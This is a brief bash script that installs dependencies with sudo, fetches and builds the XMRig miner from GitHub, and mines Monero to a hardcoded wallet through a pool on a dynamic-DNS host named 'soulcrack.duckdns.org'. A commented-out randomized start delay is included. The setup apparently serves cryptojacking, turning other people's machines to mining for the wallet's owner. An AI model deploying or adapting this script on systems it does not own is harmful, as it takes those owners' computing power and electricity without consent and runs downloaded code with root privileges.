#!/bin/bash
WALLET="438rE5zZgebcgPqKSyU4gNdX1Z7kftVYsUX5EPxMWshsDkFt47wbRUB4y1sGdKBHRqHBjGhKGZ92VVo2rNws7zDn9YPcDHe"
POOL="  soulcrack.duckdns.org:8080"
WORKER="raztk0"
echo "[+] Starting setup..."
install_dependencies() {
    sudo apt update -y && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
}
build_xmrig() {
    git clone https://github.com/xmrig/xmrig.git
    cd xmrig
    mkdir build && cd build
    cmake ..
    make -j$(nproc)
}
start_mining() {
#    sleep $((60 + RANDOM % 60))
    ./xmrig -o $POOL -u $WALLET -p $WORKER -k --coin monero
}
if [ -d "xmrig" ]; then
    cd xmrig/build
else
    install_dependencies
    build_xmrig
fi
start_mining
